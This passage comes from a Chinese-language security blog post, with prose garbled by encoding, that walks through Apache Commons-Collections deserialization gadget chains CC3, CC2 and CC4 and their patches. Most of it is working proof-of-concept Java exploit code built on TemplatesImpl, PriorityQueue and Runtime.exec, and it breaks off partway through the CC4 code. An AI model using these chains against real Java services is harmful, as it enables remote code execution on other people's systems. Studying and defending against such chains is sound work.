class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(argMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>    evilMap.put(<span class="hljs-string">&quot;xxx&quot;</span>, <span class="hljs-string">&quot;yyy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠCC6æ”¹é€ ä¸€ä¸‹ï¼Œå°±å¾—åˆ°äº†CC3ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>        &#125;;<br>        <br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728215703672.png" alt="image-20240728215703672"></p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>å‰é¢å°±æåˆ°ï¼ŒCommons-Collectionæœ‰ä¿©å®˜æ–¹çš„åŒ…ï¼š</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ul><p>ä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å…±å­˜åœ¨åŒâ¼€ä¸ªé¡¹ç›®ä¸­ã€‚</p><p>ä½¿ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹‹å‰æˆ‘ä»¬ç ”ç©¶çš„åˆ©ç”¨é“¾<code>CC1ã€CC6ã€CC3</code>åœ¨<code>commons-collections4</code>å‡èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä¸è¿‡æ–¹æ³•åå¯èƒ½ç¨æœ‰å˜åŠ¨ï¼Œå…¶å®å°±æ˜¯<code>Lazymap</code>å¤„decorateæ²¡äº†ï¼š</p><p>åŸdecorate:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªâ½…æ³•ä¸è¿‡å°±æ˜¯<code>LazyMap</code>æ„é€ å‡½æ•°çš„â¼€ä¸ªåŒ…è£…ï¼Œâ½½åœ¨4ä¸­å…¶å®åªæ˜¯æ”¹äº†ä¸ªåå­—å«<code>lazymap</code>ã€‚</p><p>4ä¸­çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;K, V&gt; map, <span class="hljs-keyword">final</span> </span><br><span class="hljs-params">Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>&lt;K,V&gt;(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†Gadgetä¸­å‡ºé”™çš„ä»£ç æ¢â¼€ä¸‹åå­—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>ç„¶åå¼¹calcæ˜¯ä¸€æ ·çš„ã€‚</p><p>ç”±æ­¤å¯å¾—ï¼ŒCCé“¾å®é™…ä¸Šå°±æ˜¯ä¸€æ¡<code>Serializable#readObject()</code>åˆ°<code>Transformer#transform()</code>çš„è°ƒç”¨é“¾ã€‚</p><p>è¦çœ‹CC2ï¼Œé‚£ä¹ˆè¿™é‡Œå°±éœ€è¦å¼•å…¥ä¸¤ä¸ªæ–°ç±»ï¼š</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>&#123;<br>            s.defaultReadObject();<br>            s.readInt();<br>            queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>                queue[i] = s.readObject();<br>            heapify();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TransformingComparator#compare</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p>Gadget chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject() =&gt; <br>heapify() =&gt; <br>siftDown() =&gt; <br>siftDownUsingComparator() =&gt; <br>comparator.compare() =&gt; <br>transformer.transform()<br></code></pre></td></tr></table></figure><ul><li><code>heapify</code> <code>int i = (size &gt;&gt;&gt; 1) - 1</code>éœ€è¦éè´Ÿ</li><li><code>siftDownUsingComparator</code> <code>half = size &gt;&gt;&gt; 1</code>éœ€è¦å¤§äºä¸Šé¢çš„i</li></ul><p>è€Œä¸”<code>PriorityQueue</code>æ„é€ å‡½æ•°ä¸ä¼šç»™sizeèµ‹åˆå€¼ï¼Œéœ€è¦ç”¨åå°„å»èµ‹å€¼ã€‚</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">pq</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br>        setFieldValue(pq, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(pq);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728222834295.png" alt="image-20240728222834295"></p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code>åœ¨<code>commons-collections4.0</code>ä»¥å‰æ˜¯ç‰ˆæœ¬æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£</p><p>å®˜æ–¹å‘å¸ƒçš„æ–°ç‰ˆæœ¬4.1å’Œ3.2.2ç”¨äºä¿®å¤CCé“¾3.2.2ä¸­å¢åŠ äº†â¼€ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">FunctorUtils#checkUnsafeSerialization`<br></code></pre></td></tr></table></figure><p>å®ƒç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå…¶ä¼šæ£€æŸ¥å¸¸â»…çš„å±é™©Transformerç±»ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ è‹¥å¼€å‘è€…æ²¡æœ‰è®¾ç½®å…¨å±€é…ç½® <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> å³é»˜è®¤æƒ…å†µä¸‹ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>4.1ä¸­è¿™å‡ ä¸ªå±é™©çš„<code>Transformer</code>ç±»ä¸å†å®ç°<code>Serializable</code>æ¥å£ï¼Œç›´æ¥ä¸èƒ½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p><strong>å› æ­¤CC2åªèƒ½åœ¨<code>commons-collections4.0</code>ä¸Šè·‘é€šã€‚</strong></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>CC4è·ŸCC2å¾ˆæ¥è¿‘ã€‚éƒ½æ˜¯åœ¨Commons-Collections4çš„åŸºç¡€ä¸Šçš„CCé“¾ã€‚</p><p>è€Œæœ¬è´¨å…¶å®CC4å°±æ˜¯ç”¨<code>InstantiateTransformer</code>ä»£æ›¿äº†CC2çš„<code>InvokerTransformer</code>ï¼Œå€Ÿç”¨ä¸€ä¸‹<code>ysoserial</code>çš„ä»£ç ,å…¶å®å°±æ˜¯<code>CommonsCollections2</code>çš„<code>TemplatesImpl</code>å˜ä½“ï¼ŒæŠŠCC2å’ŒCC3æ‹¼æ¥ä¸€ä¸‹ï¼Œå°±å¾—åˆ°äº†CC4ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> 